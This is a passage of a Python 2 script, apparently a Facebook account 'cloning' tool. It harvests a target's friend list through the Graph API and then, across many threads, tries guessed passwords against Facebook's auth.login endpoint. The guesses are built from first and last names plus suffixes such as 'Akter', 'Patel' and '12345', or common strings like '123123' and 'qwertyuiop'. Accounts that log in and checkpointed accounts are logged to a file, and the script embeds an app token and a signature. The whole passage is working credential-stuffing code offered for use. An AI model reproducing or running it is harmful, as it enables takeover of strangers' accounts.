																	print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)	
											                                       
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mRana-Nadeem\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By Mr Nadeem--•◈•---»" #Dev:M_Asim
	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
        print '\033[1;95mNext Type (python2 NADEEM0003.py) Next login facebook Start Cloning\033[1;97m....'
	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """
 Don't Worry Your Checkpoint ID Will Be Open After 7 Days 

•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m ....Rana-Nadeem....... \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                WhatsApp Group
              \033[1;91m https://chat.whatsapp.com/GWTPaJVAy1gDHIDgHEw0Ht"""
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	crack()
         
def mafia():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo11
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;95mClone Friend List Public ID."
        time.sleep(0.05)
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
	pilih_mafia()

def pilih_mafia():
	peak = raw_input("\n\033[1;95mEnter Number>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;94mFill in correctly"
		pilih_mafia()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m[•◈•] \033[1;94mEnter ID\033[1;97m: \033[1;97m")
		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mRana-Nadeem\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
		except KeyError:
			print"\x1b[1;97mID Not Found!"
			raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
			mafia()
		print"\033[1;94mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;97mFill in correctly"
		pilih_mafia()
	
	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
	jalan('\033[1;94mPlease Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m         Start Cloning Bangladesh ')
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:M_Asim
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'Akter'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'Sheikh'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + 'Jahan'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + b['last_name']
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = 'Md'+b['last_name']
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mAsim-Pardasi\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By Mr-Nadeem--•◈•---»" #Dev:M_Asim
	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
        print '\033[1;95mNext Type (python2 NADEEM0003.py) Next login facebook Start Cloning\033[1;97m....'
	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """
 
Don't Worry Your Checkpoint ID Will Be Open After 7 Days 

•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;94m .....Rana-Nadeem...... \033[1;97m :
•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                WhatsApp Group
              \033[1;94m https://chat.whatsapp.com/GWTPaJVAy1gDHIDgHEw0Ht"""
	
	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
	crack()

def test():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo12
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Friend List Public ID Testing."
        time.sleep(0.05)
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
	pilih_test()

def pilih_test():
	peak = raw_input("\n\033[1;95mEnter Number>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;94mFill in correctly"
		pilih_test()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m[•◈•] \033[1;94mEnter ID\033[1;97m: \033[1;97m")
		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mRana-Nadeem\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
		except KeyError:
			print"\x1b[1;97mID Not Found!"
			raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
			test()
		print"\033[1;94mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;97mFill in correctly"
		pilih_test()
	
	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
	jalan('\033[1;94mPlease Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m         Start Cloning All Country ')
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:M_Asim
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = '123123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = 'asdfghjkl'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = 'zxcvbnm'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = 'a1b2c3'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = '112233'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = '0987654321'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = 'qwertyuiop'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mRana-Nadeem\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By Mr-Nadeem--•◈•---»" #Dev:M_Asim
	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
        print '\033[1;95mNext Type (python2 NADEEM0003.py) Next login facebook Start Cloning\033[1;97m....'
	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """
 
Don't Worry Your Checkpoint ID Will Be Open After 7 Days 

•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;94m .....Rana-Nadeem....... \033[1;97m :
•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                WhatsApp Group
              \033[1;94m https://chat.whatsapp.com/GWTPaJVAy1gDHIDgHEw0Ht"""
	
	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
	crack()
          
def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo13
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;93mClone Friend List Public ID."
        time.sleep(0.05)
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;95mEnter Number>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;94mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		uty = raw_input("\033[1;97m[•◈•] \033[1;94mEnter ID\033[1;97m: \033[1;97m")
		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mRana-Nadeem\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
		try:
			kk = requests.get("https://graph.facebook.com/"+uty+"?access_token="+toket)
			hh = json.loads(kk.text)
			print"\033[1;97mName\033[1;97m:\033[1;94m "+hh["name"]
		except KeyError:
			print"\x1b[1;97mID Not Found!"
			raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
			super()
		print"\033[1;94mGetting IDs\033[1;97m..."
		v = requests.get("https://graph.facebook.com/"+uty+"/friends?access_token="+toket)
		f = json.loads(v.text)
		for e in f['data']:
			id.append(e['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;97mFill in correctly"
		pilih_super()
	
	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
	jalan('\033[1;94mPlease Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m           Start Cloning Indian')
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:M_Asim
		try:
			g = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			l = json.loads(a.text)
			pass1 = l['first_name']+'Patel'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			e = json.load(data)
			if 'access_token' in e:
				print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in e["error_msg"]:
					print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = 'Indiagate'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					e = json.load(data)
					if 'access_token' in e:
						print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in e["error_msg"]:
							print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = l['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							e = json.load(data)
							if 'access_token' in e:
								print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in e["error_msg"]:
									print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = l['first_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									e = json.load(data)
									if 'access_token' in e:
										print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in e["error_msg"]:
											print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'Indian'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											e = json.load(data)
											if 'access_token' in e:
												print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in e["error_msg"]:
													print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = l['first_name'] + l['last_name']
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													e = json.load(data)
													if 'access_token' in e:
														print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in e["error_msg"]:
